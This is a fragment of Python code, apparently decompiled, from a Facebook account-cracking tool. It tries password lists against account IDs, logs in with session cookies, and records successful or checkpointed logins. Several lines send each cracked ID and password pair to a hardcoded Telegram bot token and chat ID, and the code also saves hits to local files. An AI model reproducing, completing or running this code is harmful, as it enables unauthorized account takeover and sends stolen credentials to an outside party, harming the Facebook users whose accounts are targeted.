...
def login_lagi334():
	try:
		...
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/3.5.2","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
...
def grup():
	...
	ua = 'Mozilla/5.0 (Linux; Android 11; V2026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36'
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				requests.post(f"https://api.telegram.org/bot5627704839:AAEqi3ONAeXjyg62W_vBKqU6a7385O2ftHs/sendMessage?chat_id=5743223016&text=CP {idf}|{pw}")
				...
				requests.post(f"https://api.telegram.org/bot5627704839:AAEqi3ONAeXjyg62W_vBKqU6a7385O2ftHs/sendMessage?chat_id=5743223016&text=OK NGAB {idf}|{pw}")
...
def ceker(idf,pw):
	...
	try:
		...
		requests.post(f"https://api.telegram.org/bot5627704839:AAEqi3ONAeXjyg62W_vBKqU6a7385O2ftHs/sendMessage?chat_id=5743223016&text=A2F {idf}|{pw}")
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
